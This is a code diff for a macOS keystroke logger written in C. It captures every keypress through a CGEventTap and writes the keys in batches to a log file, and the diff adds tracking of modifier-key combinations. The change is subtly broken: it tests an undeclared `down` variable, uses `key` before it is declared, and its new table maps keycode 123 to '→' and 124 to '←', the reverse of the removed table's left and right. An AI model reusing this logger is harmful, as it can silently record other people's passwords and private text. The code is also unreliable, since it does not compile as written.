@@ -1,20 +1,22 @@
 #include "batman.h"
+#define BATCH_SZ 200
 
 CGEventFlags lastFlags = 0;
 
 struct hashmap *hm = NULL;
 struct hashmap *stats = NULL;
 
-int BATCH_SZ = 10;
 char buffer[BATCH_SZ];
 
-// FLUSH EVERY 1000 CHARACTERS
 int buffer_index = 0;
 int hashmap_size = 0;
 int stats_size = 0;
 
 void flush() {
+  if (buffer_index == 0) return;
+  // write to file
   fwrite(buffer, 1, buffer_index, logfile);
+  fflush(logfile);
 
   buffer_index = 0;
   memset(buffer, 0, BATCH_SZ);
@@ -36,14 +38,11 @@ int main(int argc, const char *argv[]) {
     NULL
   );
 
-  // Exit the program if unable to create the event tap.
   if (!eventTap) {
     fprintf(stderr, "ERROR: Unable to create event tap.\n");
     exit(1);
   };
 
-  // Create a run loop source and add enable the event tap.
-  printf("Press [ctrl + c] to exit.\n");
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
     kCFAllocatorDefault, eventTap, 0
   );
@@ -66,9 +65,10 @@ int main(int argc, const char *argv[]) {
 
   logfile = fopen(logfileLocation, "a");
   if (!logfile) {
-    fprintf(stderr,
-            "ERROR: Unable to open log file. Ensure that you have the proper "
-            "permissions.\n");
+    logfile = fopen(logfileLocation, "w");
+  };
+  if (!logfile) {
+    fprintf(stderr, "ERROR: Unable to open %s for writing, check permissions.\n", logfileLocation);
     exit(1);
   };
 
@@ -82,7 +82,6 @@ int main(int argc, const char *argv[]) {
   return 0;
 }
 
-// The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(
   CGEventTapProxy proxy,
   CGEventType type,
@@ -98,32 +97,41 @@ CGEventRef CGEventCallback(
       (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
   // Calculate key up/down.
-  bool down = false;
+  bool rcmd = false, lcmd = false;
+  bool rshift = false, lshift = false;
+  bool ropt = false, lopt = false;
+  bool rctrl = false, lctrl = false;
+  bool caps = false;
+
   if (type == kCGEventFlagsChanged) {
     switch (keyCode) {
-      case 54:  // [right-cmd]
-      case 55:  // [left-cmd]
-        down = (flags & kCGEventFlagMaskCommand) &&
-               !(lastFlags & kCGEventFlagMaskCommand);
+      case 54:  // [rcmd]
+        rcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
         break;
-      case 56:  // [left-shift]
-      case 60:  // [right-shift]
-        down = (flags & kCGEventFlagMaskShift) &&
-               !(lastFlags & kCGEventFlagMaskShift);
+      case 55:  // [lcmd]
+        lcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
         break;
-      case 58:  // [left-option]
-      case 61:  // [right-option]
-        down = (flags & kCGEventFlagMaskAlternate) &&
-               !(lastFlags & kCGEventFlagMaskAlternate);
+      case 56:  // [lshift]
+        lshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
         break;
-      case 59:  // [left-ctrl]
-      case 62:  // [right-ctrl]
-        down = (flags & kCGEventFlagMaskControl) &&
-               !(lastFlags & kCGEventFlagMaskControl);
+      case 60:  // [rshift]
+        rshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
+        break;
+      case 58:  // [loption]
+        lopt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
+        break;
+      case 61:  // [roption]
+        ropt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
+        break;
+      case 59:  // [lctrl]
+        lctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
+        break;
+      case 62:  // [rctrl]
+        rctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
         break;
       case 57:  // [caps]
-        down = (flags & kCGEventFlagMaskAlphaShift) &&
-               !(lastFlags & kCGEventFlagMaskAlphaShift);
+        caps = (flags & kCGEventFlagMaskAlphaShift) && !(lastFlags & kCGEventFlagMaskAlphaShift);
+        break;
       default:
         break;
     }
@@ -134,11 +142,27 @@ CGEventRef CGEventCallback(
 
   if (!down) return event;
 
-  bool shift = flags & kCGEventFlagMaskShift;
-  bool caps = flags & kCGEventFlagMaskAlphaShift;
-  // this should be batched up in a buffer and written to the file in one go
-  buffer[buffer_index] = convertKeyCode(keyCode, shift, caps)[0];
-  buffer_index++;
+  char key_str[128];
+  key_str[0] = '\0';
+  if (rcmd) strcat(key_str, "rcmd+");
+  if (lcmd) strcat(key_str, "lcmd+");
+  if (rshift) strcat(key_str, "rshift+");
+  if (lshift) strcat(key_str, "lshift+");
+  if (ropt) strcat(key_str, "ropt+");
+  if (lopt) strcat(key_str, "lopt+");
+  if (rctrl) strcat(key_str, "rctrl+");
+  if (lctrl) strcat(key_str, "lctrl+");
+  if (caps) strcat(key_str, "caps+");
+
+  strcat(key_str, key);
+  printf("Key combination: %s\n", key_str);
+
+  const char *key = convertKeyCode(keyCode, lshift || rshift, caps);
+  for (int i = 0; i < strlen(key); i++) {
+    buffer[buffer_index] = key[i];
+    buffer_index++;
+  };
+
 
   /*
     we need to also keep stats
@@ -149,174 +173,100 @@ CGEventRef CGEventCallback(
     - ignore (shift, ctrl, cmd, option)
   */
 
-  if (buffer_index == BATCH_SZ) {
+
+  if (buffer_index >= BATCH_SZ - 20) {
     flush();
     update_hashmap(&hm, &hashmap_size);
   };
   return event;
 }
 
-const char *letters_cap_set1 = "ASDFHGZXCVBQWERT";
-const char *letters_cap_set2 = "OU{IP LJ";
-const char *symbols_cap_set1 = "123465+97-80]";
-
-const char *letters_small_set1 = "asdfhgzxcvbqwert";
-const char *letters_small_set2 = "ou[ip lj";
-const char *symbols_small_set1 = "!@#$^%+(&_*)}";
-
-const char *nums = "01234567 89";
-
 const char *convertKeyCode(int keyCode, bool shift, bool caps) {
-  switch ((int)keyCode) {
-    case 0 ... 17:
-      return shift || caps ? &letters_cap_set1[keyCode]
-                           : &letters_small_set1[keyCode];
-    case 18 ... 30:
-      return shift || caps ? &symbols_cap_set1[keyCode - 18]
-                           : &symbols_small_set1[keyCode - 18];
-    case 31 ... 35:
-    // NO 36
-    case 37:
-    case 38:
-      return shift || caps ? &letters_cap_set2[keyCode - 31]
-                           : &letters_small_set2[keyCode - 31];
-    case 39:
-      return shift ? "\"" : "'";
-    case 40:
-      return shift || caps ? "K" : "k";
-    case 41:
-      return shift ? ":" : ";";
-    case 42:
-      return shift ? "|" : "\\";
-    case 43:
-      return shift ? "<" : ",";
-    case 44:
-      return shift ? "?" : "/";
-    case 45:
-      return shift || caps ? "N" : "n";
-    case 46:
-      return shift || caps ? "M" : "m";
-    case 47:
-      return shift ? ">" : ".";
-    case 50:
-      return shift ? "~" : "`";
-    case 65:
-      return "[decimal]";
-    case 67:
-      return "[star]";
-    case 69:
-      return "[plus]";
-    case 71:
-      return "[clear]";
-    case 75:
-      return "[div]";
-    case 76:
-      return "[enter]";
-    case 78:
-      return "[hyphen]";
-    case 81:
-      return "[eq]";
-
-    case 82 ... 89:
-    // NO 90
-    case 91 ... 92:
-      return &nums[keyCode - 82];
-    case 36:
-      return "[ret]";
-    case 48:
-      return "[tab]";
-    case 49:
-      return " ";
-    case 51:
-      return "[del]";
-    case 53:
-      return "[esc]";
-    case 54:
-      return "[r-cmd]";
-    case 55:
-      return "[l-cmd]";
-    case 56:
-      return "[l-shift]";
-    case 57:
-      return "[caps]";
-    case 58:
-      return "[l-option]";
-    case 59:
-      return "[l-ctrl]";
-    case 60:
-      return "[r-shift]";
-    case 61:
-      return "[r-option]";
-    case 62:
-      return "[r-ctrl]";
-    case 63:
-      return "[fn]";
-    case 64:
-      return "[f17]";
-    case 72:
-      return "[volup]";
-    case 73:
-      return "[voldown]";
-    case 74:
-      return "[mute]";
-    case 79:
-      return "[f18]";
-    case 80:
-      return "[f19]";
-    case 90:
-      return "[f20]";
-    case 96:
-      return "[f5]";
-    case 97:
-      return "[f6]";
-    case 98:
-      return "[f7]";
-    case 99:
-      return "[f3]";
-    case 100:
-      return "[f8]";
-    case 101:
-      return "[f9]";
-    case 103:
-      return "[f11]";
-    case 105:
-      return "[f13]";
-    case 106:
-      return "[f16]";
-    case 107:
-      return "[f14]";
-    case 109:
-      return "[f10]";
-    case 111:
-      return "[f12]";
-    case 113:
-      return "[f15]";
-    case 114:
-      return "[help]";
-    case 115:
-      return "[home]";
-    case 116:
-      return "[pgup]";
-    case 117:
-      return "[fwddel]";
-    case 118:
-      return "[f4]";
-    case 119:
-      return "[end]";
-    case 120:
-      return "[f2]";
-    case 121:
-      return "[pgdown]";
-    case 122:
-      return "[f1]";
-    case 123:
-      return "[left]";
-    case 124:
-      return "[right]";
-    case 125:
-      return "[down]";
-    case 126:
-      return "[up]";
+  switch ((int) keyCode) {
+    case 0:   return shift || caps ? "A" : "a";
+    case 1:   return shift || caps ? "S" : "s";
+    case 2:   return shift || caps ? "D" : "d";
+    case 3:   return shift || caps ? "F" : "f";
+    case 4:   return shift || caps ? "H" : "h";
+    case 5:   return shift || caps ? "G" : "g";
+    case 6:   return shift || caps ? "Z" : "z";
+    case 7:   return shift || caps ? "X" : "x";
+    case 8:   return shift || caps ? "C" : "c";
+    case 9:   return shift || caps ? "V" : "v";
+    case 11:  return shift || caps ? "B" : "b";
+    case 12:  return shift || caps ? "Q" : "q";
+    case 13:  return shift || caps ? "W" : "w";
+    case 14:  return shift || caps ? "E" : "e";
+    case 15:  return shift || caps ? "R" : "r";
+    case 16:  return shift || caps ? "Y" : "y";
+    case 17:  return shift || caps ? "T" : "t";
+    case 18:  return shift ? "!" : "1";
+    case 19:  return shift ? "@" : "2";
+    case 20:  return shift ? "#" : "3";
+    case 21:  return shift ? "$" : "4";
+    case 22:  return shift ? "^" : "6";
+    case 23:  return shift ? "%" : "5";
+    case 24:  return shift ? "+" : "=";
+    case 25:  return shift ? "(" : "9";
+    case 26:  return shift ? "&" : "7";
+    case 27:  return shift ? "_" : "-";
+    case 28:  return shift ? "*" : "8";
+    case 29:  return shift ? ")" : "0";
+    case 30:  return shift ? "}" : "]";
+    case 31:  return shift || caps ? "O" : "o";
+    case 32:  return shift || caps ? "U" : "u";
+    case 33:  return shift ? "{" : "[";
+    case 34:  return shift || caps ? "I" : "i";
+    case 35:  return shift || caps ? "P" : "p";
+    case 37:  return shift || caps ? "L" : "l";
+    case 38:  return shift || caps ? "J" : "j";
+    case 39:  return shift ? "\"" : "'";
+    case 40:  return shift || caps ? "K" : "k";
+    case 41:  return shift ? ":" : ";";
+    case 42:  return shift ? "|" : "\\";
+    case 43:  return shift ? "<" : ",";
+    case 44:  return shift ? "?" : "/";
+    case 45:  return shift || caps ? "N" : "n";
+    case 46:  return shift || caps ? "M" : "m";
+    case 47:  return shift ? ">" : ".";
+    case 50:  return shift ? "~" : "`";
+    case 65:  return ".";
+    case 67:  return "*";
+    case 69:  return "+";
+    case 71:  return "🔙";
+    case 75:  return "/";
+    case 76:  return "⏎";
+    case 78:  return "-";
+    case 81:  return "=";
+    case 82:  return "0";
+    case 83:  return "1";
+    case 84:  return "2";
+    case 85:  return "3";
+    case 86:  return "4";
+    case 87:  return "5";
+    case 88:  return "6";
+    case 89:  return "7";
+    case 91:  return "8";
+    case 92:  return "9";
+    case 36:  return "\n";
+    case 48:  return "\t";
+    case 49:  return " ";
+    case 51:  return "[del]";
+    case 53:  return "[esc]";
+    case 54:  return "[r⌘]";
+    case 55:  return "[l⌘]";
+    case 58:  return "[l⌥]";
+    case 59:  return "[l⎈]";
+    case 61:  return "[r⌥]";
+    case 62:  return "[r⎈]";
+    case 63:  return "[fn]";
+    case 72:  return "[volup]";
+    case 73:  return "[voldn]";
+    case 74:  return "[mute]";
+    case 123: return "→";
+    case 124: return "←";
+    case 125: return "↓";
+    case 126: return "↑";
   }
-  return "[unknown]";
+  return "[?]";
 }
